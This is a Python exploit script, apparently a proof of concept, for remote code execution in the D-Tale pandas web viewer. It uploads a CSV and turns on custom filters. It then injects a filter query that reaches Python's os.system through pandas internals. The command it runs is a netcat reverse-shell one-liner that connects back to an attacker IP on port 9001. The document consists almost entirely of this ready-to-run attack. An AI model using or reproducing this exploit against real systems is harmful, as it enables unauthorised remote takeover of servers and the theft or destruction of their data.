import requests
from urllib.parse import quote

# Base URL of server
BASE_URL = "http://127.0.0.1:5000" #Change the IP

# Command to execute
cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <attacker IP> 9001 >/tmp/f"

# Define the file to send in the request
files = {
    "poc.csv": ("poc.csv", "a,b\n1,1", "text/csv"),
    "header": (None, "true"),
    "separatorType": (None, "comma"),
    "separator": (None, "")
}

# Send POST request to upload file
print("[+] Sending POST request to upload file...")
upload_response = requests.post(f"{BASE_URL}/dtale/upload", files=files)
upload_response.raise_for_status()
print("[+] File uploaded successfully.")

# Get data ID from returned result
data_id = upload_response.json().get("data_id")
if not data_id:
    raise ValueError("[!] Unable to get data_id from response.")
print(f"[+] Retrieved data_id: {data_id}")

# Update settings for data
print("[+] Sending GET request to update settings...")
settings = '{"enable_custom_filters":true}'
update_response = requests.get(f"{BASE_URL}/dtale/update-settings/{data_id}?settings={quote(settings)}")
update_response.raise_for_status()
assert update_response.json().get("success"), "[!] Update settings failed."
print("[+] Settings updated successfully.")

print(f"[+] Preparing payload to execute command: {cmd}")

# Create payload and encode URL
payload = f"@pd.core.frame.com.builtins.__import__('os').system('{cmd}')"
encoded_payload = quote(payload)
print(f"[+] Encoded payload: {encoded_payload}")

# Send request to check filter
print("[+] Sending GET request to test filter...")
filter_response = requests.get(f"{BASE_URL}/dtale/test-filter/{data_id}?query={encoded_payload}&save=true")
filter_response.raise_for_status()
assert filter_response.json().get("success"), "[!] Filter execution failed."
print("[+] Filter executed successfully.")
